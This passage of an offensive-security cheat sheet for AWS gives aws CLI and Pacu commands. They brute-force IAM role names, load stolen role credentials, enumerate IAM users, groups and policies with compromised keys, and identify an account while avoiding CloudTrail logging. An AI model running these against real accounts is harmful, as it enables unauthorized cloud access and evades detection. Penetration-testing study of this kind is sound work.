</span><span id="__span-226-3"><a id="__codelineno-226-3" name="__codelineno-226-3" href="#__codelineno-226-3"></a><span class="w">    </span><span class="nt">&quot;Statement&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
</span><span id="__span-226-4"><a id="__codelineno-226-4" name="__codelineno-226-4" href="#__codelineno-226-4"></a><span class="w">        </span><span class="p">{</span>
</span><span id="__span-226-5"><a id="__codelineno-226-5" name="__codelineno-226-5" href="#__codelineno-226-5"></a><span class="w">            </span><span class="nt">&quot;Sid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AllowUserToListBucket&quot;</span><span class="p">,</span>
</span><span id="__span-226-6"><a id="__codelineno-226-6" name="__codelineno-226-6" href="#__codelineno-226-6"></a><span class="w">            </span><span class="nt">&quot;Effect&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Allow&quot;</span><span class="p">,</span>
</span><span id="__span-226-7"><a id="__codelineno-226-7" name="__codelineno-226-7" href="#__codelineno-226-7"></a><span class="w">            </span><span class="nt">&quot;Resource&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;arn:aws:s3:::offseclab-dummy-bucket-28967-25641-13328&quot;</span><span class="p">,</span>
</span><span id="__span-226-8"><a id="__codelineno-226-8" name="__codelineno-226-8" href="#__codelineno-226-8"></a><span class="w">            </span><span class="nt">&quot;Principal&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-226-9"><a id="__codelineno-226-9" name="__codelineno-226-9" href="#__codelineno-226-9"></a><span class="w">                </span><span class="nt">&quot;AWS&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;arn:aws:iam::123456789012:user/cloudadmin&quot;</span><span class="p">]</span>
</span><span id="__span-226-10"><a id="__codelineno-226-10" name="__codelineno-226-10" href="#__codelineno-226-10"></a><span class="w">            </span><span class="p">},</span>
</span><span id="__span-226-11"><a id="__codelineno-226-11" name="__codelineno-226-11" href="#__codelineno-226-11"></a><span class="w">            </span><span class="nt">&quot;Action&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;s3:ListBucket&quot;</span>
</span><span id="__span-226-12"><a id="__codelineno-226-12" name="__codelineno-226-12" href="#__codelineno-226-12"></a>
</span><span id="__span-226-13"><a id="__codelineno-226-13" name="__codelineno-226-13" href="#__codelineno-226-13"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-226-14"><a id="__codelineno-226-14" name="__codelineno-226-14" href="#__codelineno-226-14"></a><span class="w">    </span><span class="p">]</span>
</span><span id="__span-226-15"><a id="__codelineno-226-15" name="__codelineno-226-15" href="#__codelineno-226-15"></a><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Apply the created policy and check the response</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-227-1"><a id="__codelineno-227-1" name="__codelineno-227-1" href="#__codelineno-227-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>attacker<span class="w"> </span>profile<span class="o">]</span><span class="w"> </span>s3api<span class="w"> </span>put-bucket-policy<span class="w"> </span>--bucket<span class="w"> </span><span class="o">[</span>created<span class="w"> </span>bucket<span class="o">]</span><span class="w"> </span>--policy<span class="w"> </span>file://<span class="o">[</span>file.json<span class="o">]</span>
</span><span id="__span-227-2"><a id="__codelineno-227-2" name="__codelineno-227-2" href="#__codelineno-227-2"></a>
</span><span id="__span-227-3"><a id="__codelineno-227-3" name="__codelineno-227-3" href="#__codelineno-227-3"></a><span class="c1">## example</span>
</span><span id="__span-227-4"><a id="__codelineno-227-4" name="__codelineno-227-4" href="#__codelineno-227-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>attacker<span class="w"> </span>s3api<span class="w"> </span>put-bucket-policy<span class="w"> </span>--bucket<span class="w"> </span>offseclab-dummy-bucket-28967-25641-13328<span class="w"> </span>--policy<span class="w"> </span>file://grant-s3-bucket-read.json
</span></code></pre></div>
<p><strong><em>Automated Brute Force Roles using Pacu</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-228-1"><a id="__codelineno-228-1" name="__codelineno-228-1" href="#__codelineno-228-1"></a>Pacu
</span><span id="__span-228-2"><a id="__codelineno-228-2" name="__codelineno-228-2" href="#__codelineno-228-2"></a>What<span class="w"> </span>would<span class="w"> </span>you<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>name<span class="w"> </span>this<span class="w"> </span>new<span class="w"> </span>session?<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-228-3"><a id="__codelineno-228-3" name="__codelineno-228-3" href="#__codelineno-228-3"></a>Pacu<span class="w"> </span><span class="o">(</span>offseclab:No<span class="w"> </span>Keys<span class="w"> </span>Set<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>import_keys<span class="w"> </span>attacker
</span><span id="__span-228-4"><a id="__codelineno-228-4" name="__codelineno-228-4" href="#__codelineno-228-4"></a>Pacu<span class="w"> </span><span class="o">(</span>offseclab:imported-attacker<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>ls
</span><span id="__span-228-5"><a id="__codelineno-228-5" name="__codelineno-228-5" href="#__codelineno-228-5"></a>Pacu<span class="w"> </span><span class="o">(</span>offseclab:imported-attacker<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nb">help</span><span class="w"> </span>iam__enum_roles
</span><span id="__span-228-6"><a id="__codelineno-228-6" name="__codelineno-228-6" href="#__codelineno-228-6"></a>Pacu<span class="w"> </span><span class="o">(</span>offseclab:imported-attacker<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>run<span class="w"> </span>iam__enum_roles<span class="w"> </span>--word-list<span class="w"> </span>/tmp/role-names.txt<span class="w"> </span>--account-id<span class="w"> </span><span class="o">[</span>accountId<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>Set New Environment Credentials</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-229-1"><a id="__codelineno-229-1" name="__codelineno-229-1" href="#__codelineno-229-1"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_access_key_id<span class="w"> </span><span class="o">[</span>access<span class="w"> </span>keyId<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>roleprofile
</span><span id="__span-229-2"><a id="__codelineno-229-2" name="__codelineno-229-2" href="#__codelineno-229-2"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_secret_access_key<span class="w"> </span><span class="o">[</span>access<span class="w"> </span>key<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>roleprofile
</span><span id="__span-229-3"><a id="__codelineno-229-3" name="__codelineno-229-3" href="#__codelineno-229-3"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_session_token<span class="w"> </span><span class="o">[</span>session<span class="w"> </span>token<span class="o">]</span><span class="w"> </span>--profile<span class="w"> </span>roleprofile
</span><span id="__span-229-4"><a id="__codelineno-229-4" name="__codelineno-229-4" href="#__codelineno-229-4"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>region<span class="w"> </span>us-east-1<span class="w"> </span>--profile<span class="w"> </span>roleprofile
</span><span id="__span-229-5"><a id="__codelineno-229-5" name="__codelineno-229-5" href="#__codelineno-229-5"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>output<span class="w"> </span>json<span class="w"> </span>--profile<span class="w"> </span>roleprofile
</span></code></pre></div>
<h3 id="initial-iam-reconnaissance"><strong>Initial IAM Reconnaissance</strong></h3>
<h4 id="examining-compromised-credentials"><strong>Examining Compromised Credentials</strong></h4>
<p><strong><em>Get IAM User Details</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-230-1"><a id="__codelineno-230-1" name="__codelineno-230-1" href="#__codelineno-230-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>sts<span class="w"> </span>get-caller-identity
</span></code></pre></div>
<p><strong><em>Get IAM User Account using AccessKeyID</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-231-1"><a id="__codelineno-231-1" name="__codelineno-231-1" href="#__codelineno-231-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>sts<span class="w"> </span>get-access-key-info<span class="w"> </span>--access-key-id<span class="w"> </span><span class="o">[</span>key<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>Get IAM User Details Without Logged in events/cloudtrails</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-232-1"><a id="__codelineno-232-1" name="__codelineno-232-1" href="#__codelineno-232-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>lambda<span class="w"> </span>invoke<span class="w"> </span>--function-name<span class="w"> </span>arn:aws:lambda:us-east-1:123456789012:function:nonexistent-function<span class="w"> </span>outfile
</span></code></pre></div>
<h4 id="scoping-iam-permissions"><strong>Scoping IAM permissions</strong></h4>
<aside>


**Inline Policies** are directly linked to a single identity and exist only in that identity space. **Managed Policies** stand as distinct, reusable policies that can be associated with multiple identities.

</aside>

<p><strong><em>List inline policies and managed policies associated with the user</em></strong> </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-233-1"><a id="__codelineno-233-1" name="__codelineno-233-1" href="#__codelineno-233-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-user-policies<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>username<span class="o">]</span>
</span><span id="__span-233-2"><a id="__codelineno-233-2" name="__codelineno-233-2" href="#__codelineno-233-2"></a>
</span><span id="__span-233-3"><a id="__codelineno-233-3" name="__codelineno-233-3" href="#__codelineno-233-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>username<span class="o">]</span>
</span><span id="__span-233-4"><a id="__codelineno-233-4" name="__codelineno-233-4" href="#__codelineno-233-4"></a>
</span><span id="__span-233-5"><a id="__codelineno-233-5" name="__codelineno-233-5" href="#__codelineno-233-5"></a><span class="c1">## Example</span>
</span><span id="__span-233-6"><a id="__codelineno-233-6" name="__codelineno-233-6" href="#__codelineno-233-6"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>list-user-policies<span class="w"> </span>--user-name<span class="w"> </span>clouddesk-plove
</span><span id="__span-233-7"><a id="__codelineno-233-7" name="__codelineno-233-7" href="#__codelineno-233-7"></a>
</span><span id="__span-233-8"><a id="__codelineno-233-8" name="__codelineno-233-8" href="#__codelineno-233-8"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>clouddesk-plove
</span></code></pre></div>
<p><strong><em>List Groups of User</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-234-1"><a id="__codelineno-234-1" name="__codelineno-234-1" href="#__codelineno-234-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-groups-for-user<span class="w"> </span>--user-name<span class="w"> </span><span class="o">[</span>username<span class="o">]</span>
</span></code></pre></div>
<p><strong><em>List Policies Associated with Group</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-235-1"><a id="__codelineno-235-1" name="__codelineno-235-1" href="#__codelineno-235-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-group-policies<span class="w"> </span>--group-name<span class="w"> </span><span class="o">[</span>group<span class="o">]</span>
</span><span id="__span-235-2"><a id="__codelineno-235-2" name="__codelineno-235-2" href="#__codelineno-235-2"></a>
</span><span id="__span-235-3"><a id="__codelineno-235-3" name="__codelineno-235-3" href="#__codelineno-235-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-attached-group-policies<span class="w"> </span>--group-name<span class="w"> </span><span class="o">[</span>group<span class="o">]</span>
</span><span id="__span-235-4"><a id="__codelineno-235-4" name="__codelineno-235-4" href="#__codelineno-235-4"></a>
</span><span id="__span-235-5"><a id="__codelineno-235-5" name="__codelineno-235-5" href="#__codelineno-235-5"></a><span class="c1">## Example</span>
</span><span id="__span-235-6"><a id="__codelineno-235-6" name="__codelineno-235-6" href="#__codelineno-235-6"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>list-group-policies<span class="w"> </span>--group-name<span class="w"> </span>support
</span><span id="__span-235-7"><a id="__codelineno-235-7" name="__codelineno-235-7" href="#__codelineno-235-7"></a>
</span><span id="__span-235-8"><a id="__codelineno-235-8" name="__codelineno-235-8" href="#__codelineno-235-8"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>list-attached-group-policies<span class="w"> </span>--group-name<span class="w"> </span>support
</span></code></pre></div>
<p><strong><em>Check Current Version of the Policy Since Policies Support Versioning</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-236-1"><a id="__codelineno-236-1" name="__codelineno-236-1" href="#__codelineno-236-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span><span class="s2">&quot;[arn]&quot;</span>
</span><span id="__span-236-2"><a id="__codelineno-236-2" name="__codelineno-236-2" href="#__codelineno-236-2"></a>
</span><span id="__span-236-3"><a id="__codelineno-236-3" name="__codelineno-236-3" href="#__codelineno-236-3"></a><span class="c1">## Example</span>
</span><span id="__span-236-4"><a id="__codelineno-236-4" name="__codelineno-236-4" href="#__codelineno-236-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span><span class="s2">&quot;arn:aws:iam::aws:policy/job-function/SupportUser&quot;</span>
</span></code></pre></div>
<p><strong><em>Check Policy Document With Associated Version</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-237-1"><a id="__codelineno-237-1" name="__codelineno-237-1" href="#__codelineno-237-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span><span class="s2">&quot;[arn]&quot;</span><span class="w"> </span>--version-id<span class="w"> </span><span class="o">[</span>version<span class="o">]</span>
</span><span id="__span-237-2"><a id="__codelineno-237-2" name="__codelineno-237-2" href="#__codelineno-237-2"></a>
</span><span id="__span-237-3"><a id="__codelineno-237-3" name="__codelineno-237-3" href="#__codelineno-237-3"></a><span class="c1">## Example</span>
</span><span id="__span-237-4"><a id="__codelineno-237-4" name="__codelineno-237-4" href="#__codelineno-237-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::aws:policy/job-function/SupportUser<span class="w"> </span>--version-id<span class="w"> </span>v8
</span></code></pre></div>
<h3 id="iam-resources-enumeration"><strong>IAM Resources Enumeration</strong></h3>
<h4 id="enumerating-iam-resources"><strong>Enumerating IAM Resources</strong></h4>
<p><strong><em>Check what actions this policy grants to enumerate IAM resources</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-238-1"><a id="__codelineno-238-1" name="__codelineno-238-1" href="#__codelineno-238-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span><span class="o">[</span>arn<span class="o">]</span><span class="w"> </span>--version-id<span class="w"> </span><span class="o">[</span>version<span class="o">]</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;iam&quot;</span>
</span><span id="__span-238-2"><a id="__codelineno-238-2" name="__codelineno-238-2" href="#__codelineno-238-2"></a>
</span><span id="__span-238-3"><a id="__codelineno-238-3" name="__codelineno-238-3" href="#__codelineno-238-3"></a><span class="c1">## Example</span>
</span><span id="__span-238-4"><a id="__codelineno-238-4" name="__codelineno-238-4" href="#__codelineno-238-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::aws:policy/job-function/SupportUser<span class="w"> </span>--version-id<span class="w"> </span>v8<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;iam&quot;</span>
</span></code></pre></div>
<p><strong><em>Display a description of the command usage including a list of all available subcommands</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-239-1"><a id="__codelineno-239-1" name="__codelineno-239-1" href="#__codelineno-239-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;list-|get-|generate-&quot;</span>
</span><span id="__span-239-2"><a id="__codelineno-239-2" name="__codelineno-239-2" href="#__codelineno-239-2"></a>
</span><span id="__span-239-3"><a id="__codelineno-239-3" name="__codelineno-239-3" href="#__codelineno-239-3"></a><span class="c1">## Example</span>
</span><span id="__span-239-4"><a id="__codelineno-239-4" name="__codelineno-239-4" href="#__codelineno-239-4"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span><span class="nb">help</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;list-|get-|generate-&quot;</span>
</span></code></pre></div>
<p><strong><em>IAM Resource Enumeration Commands</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-240-1"><a id="__codelineno-240-1" name="__codelineno-240-1" href="#__codelineno-240-1"></a>iam<span class="w"> </span>get-account-summary
</span><span id="__span-240-2"><a id="__codelineno-240-2" name="__codelineno-240-2" href="#__codelineno-240-2"></a>iam<span class="w"> </span>list-users
</span><span id="__span-240-3"><a id="__codelineno-240-3" name="__codelineno-240-3" href="#__codelineno-240-3"></a>iam<span class="w"> </span>list-policies<span class="w"> </span>--scope<span class="w"> </span>Local<span class="w"> </span>--only-attached
</span><span id="__span-240-4"><a id="__codelineno-240-4" name="__codelineno-240-4" href="#__codelineno-240-4"></a>
</span><span id="__span-240-5"><a id="__codelineno-240-5" name="__codelineno-240-5" href="#__codelineno-240-5"></a>iam<span class="w"> </span>list-user-policies
</span><span id="__span-240-6"><a id="__codelineno-240-6" name="__codelineno-240-6" href="#__codelineno-240-6"></a>iam<span class="w"> </span>get-user-policy
</span><span id="__span-240-7"><a id="__codelineno-240-7" name="__codelineno-240-7" href="#__codelineno-240-7"></a>iam<span class="w"> </span>list-group-policies
</span><span id="__span-240-8"><a id="__codelineno-240-8" name="__codelineno-240-8" href="#__codelineno-240-8"></a>iam<span class="w"> </span>get-group-policy
</span><span id="__span-240-9"><a id="__codelineno-240-9" name="__codelineno-240-9" href="#__codelineno-240-9"></a>iam<span class="w"> </span>list-role-policies
</span><span id="__span-240-10"><a id="__codelineno-240-10" name="__codelineno-240-10" href="#__codelineno-240-10"></a>iam<span class="w"> </span>get-role-policy
</span><span id="__span-240-11"><a id="__codelineno-240-11" name="__codelineno-240-11" href="#__codelineno-240-11"></a>
</span><span id="__span-240-12"><a id="__codelineno-240-12" name="__codelineno-240-12" href="#__codelineno-240-12"></a>iam<span class="w"> </span>get-account-authorization-details<span class="w"> </span>--filter<span class="w"> </span>User<span class="w"> </span>Group<span class="w"> </span>LocalManagedPolicy<span class="w"> </span>Role
</span><span id="__span-240-13"><a id="__codelineno-240-13" name="__codelineno-240-13" href="#__codelineno-240-13"></a>
</span><span id="__span-240-14"><a id="__codelineno-240-14" name="__codelineno-240-14" href="#__codelineno-240-14"></a>iam<span class="w"> </span>list-policy-versions<span class="w"> </span>--policy-arn<span class="w"> </span><span class="o">[</span>arn<span class="o">]</span>
</span><span id="__span-240-15"><a id="__codelineno-240-15" name="__codelineno-240-15" href="#__codelineno-240-15"></a>iam<span class="w"> </span>get-account-authorization-details<span class="w"> </span>--filter<span class="w"> </span>LocalManagedPolicy
</span></code></pre></div>
<h4 id="processing-api-response-data-with-jmespath"><strong>Processing API Response data with JMESPath</strong></h4>
<p><strong><em>Filter data using JMESPath</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-241-1"><a id="__codelineno-241-1" name="__codelineno-241-1" href="#__codelineno-241-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span><span class="w"> </span>iam<span class="w"> </span>get-account-authorization-details<span class="w"> </span>--filter<span class="w"> </span>User<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;UserDetailList[].UserName&quot;</span>
</span><span id="__span-241-2"><a id="__codelineno-241-2" name="__codelineno-241-2" href="#__codelineno-241-2"></a>
</span><span id="__span-241-3"><a id="__codelineno-241-3" name="__codelineno-241-3" href="#__codelineno-241-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>get-account-authorization-details<span class="w"> </span>--filter<span class="w"> </span>User<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;UserDetailList[0].[UserName,Path,GroupList]&quot;</span>
</span><span id="__span-241-4"><a id="__codelineno-241-4" name="__codelineno-241-4" href="#__codelineno-241-4"></a>
</span><span id="__span-241-5"><a id="__codelineno-241-5" name="__codelineno-241-5" href="#__codelineno-241-5"></a>aws<span class="w"> </span>--profile<span class="w"> </span>target<span class="w"> </span>iam<span class="w"> </span>get-account-authorization-details<span class="w"> </span>--filter<span class="w"> </span>User<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;UserDetailList[?contains(UserName, &#39;admin&#39;)].{Name: UserName}&quot;</span>
</span></code></pre></div>
<p><a href="https://jmespath.org/">JMESPath  JMESPath</a></p>
<h4 id="running-automated-enumeration-with-pacu"><strong>Running Automated Enumeration with Pacu</strong></h4>
<p><strong><em>Inital Access using Pacu</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-242-1"><a id="__codelineno-242-1" name="__codelineno-242-1" href="#__codelineno-242-1"></a>kal@kali:~$<span class="w"> </span>Pacu
</span><span id="__span-242-2"><a id="__codelineno-242-2" name="__codelineno-242-2" href="#__codelineno-242-2"></a>What<span class="w"> </span>would<span class="w"> </span>you<span class="w"> </span>like<span class="w"> </span>to<span class="w"> </span>name<span class="w"> </span>this<span class="w"> </span>new<span class="w"> </span>session?<span class="w"> </span><span class="o">[</span>domain<span class="o">]</span>
</span><span id="__span-242-3"><a id="__codelineno-242-3" name="__codelineno-242-3" href="#__codelineno-242-3"></a>Pacu<span class="w"> </span><span class="o">(</span>offseclab:No<span class="w"> </span>Keys<span class="w"> </span>Set<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>import_keys<span class="w"> </span><span class="o">[</span>profile<span class="o">]</span>
</span><span id="__span-242-4"><a id="__codelineno-242-4" name="__codelineno-242-4" href="#__codelineno-242-4"></a>Pacu<span class="w"> </span><span class="o">(</span>offseclab:imported-attacker<span class="o">)</span><span class="w"> </span>&gt;<span class="w"> </span>ls
</span></code></pre></div>
<p><strong><em>Example of Listing Users/Roles/Policies/Groups</em></strong> </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-243-1"><a id="__codelineno-243-1" name="__codelineno-243-1" href="#__codelineno-243-1"></a><span class="nb">help</span><span class="w"> </span>iam__enum_users_roles_policies_groups
</span><span id="__span-243-2"><a id="__codelineno-243-2" name="__codelineno-243-2" href="#__codelineno-243-2"></a>run<span class="w"> </span>iam__enum_users_roles_policies_groups
</span><span id="__span-243-3"><a id="__codelineno-243-3" name="__codelineno-243-3" href="#__codelineno-243-3"></a>
</span><span id="__span-243-4"><a id="__codelineno-243-4" name="__codelineno-243-4" href="#__codelineno-243-4"></a>services
</span><span id="__span-243-5"><a id="__codelineno-243-5" name="__codelineno-243-5" href="#__codelineno-243-5"></a>data<span class="w"> </span>IAM
</span></code></pre></div>
<h4 id="extracting-insights-from-enumeration-data"><strong>Extracting Insights from Enumeration Data</strong></h4>
<p><a href="https://github.com/ReversecLabs/awspx">https://github.com/ReversecLabs/awspx</a></p>
<p><a href="https://github.com/duo-labs/cloudmapper">https://github.com/duo-labs/cloudmapper</a></p>
<hr />












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
      
      
    
    <a href="https://barbakadze.medium.com/" target="_blank" rel="noopener" title="barbakadze.medium.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4.21 0A4.2 4.2 0 0 0 0 4.21v15.58A4.2 4.2 0 0 0 4.21 24h15.58A4.2 4.2 0 0 0 24 19.79v-1.093a5 5 0 0 1-.422.02c-2.577 0-4.027-2.146-4.09-4.832a8 8 0 0 1 .022-.708c.093-1.186.475-2.241 1.105-3.022a3.9 3.9 0 0 1 1.395-1.1c.468-.237 1.127-.367 1.664-.367h.023q.151 0 .303.01V4.211A4.2 4.2 0 0 0 19.79 0Zm.198 5.583h4.165l3.588 8.435 3.59-8.435h3.864v.146l-.019.004c-.705.16-1.063.397-1.063 1.254h-.003l.003 10.274c.06.676.424.885 1.063 1.03l.02.004v.145h-4.923v-.145l.019-.005c.639-.144.994-.353 1.054-1.03V7.267l-4.745 11.15h-.261L6.15 7.569v9.445c0 .857.358 1.094 1.063 1.253l.02.004v.147H4.405v-.147l.019-.004c.705-.16 1.065-.397 1.065-1.253V6.987c0-.857-.358-1.094-1.064-1.254l-.018-.004zm19.25 3.668c-1.086.023-1.733 1.323-1.813 3.124H24V9.298a1.4 1.4 0 0 0-.342-.047m-1.862 3.632c-.1 1.756.86 3.239 2.204 3.634v-3.634z"/></svg>
    </a>
  
    
    
    
    
      
      
    
    <a href="https://github.com/gbarbakadz" target="_blank" rel="noopener" title="github.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["content.code.copy", "content.action.edit", "content.action.view", "content.tooltips", "navigation.tracking", "navigation.top", "navigation.sections", "navigation.path", "search.share", "search.suggest"], "search": "../../assets/javascripts/workers/search.7a47a382.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.e71a0d61.min.js"></script>
      
    
  </body>
</html>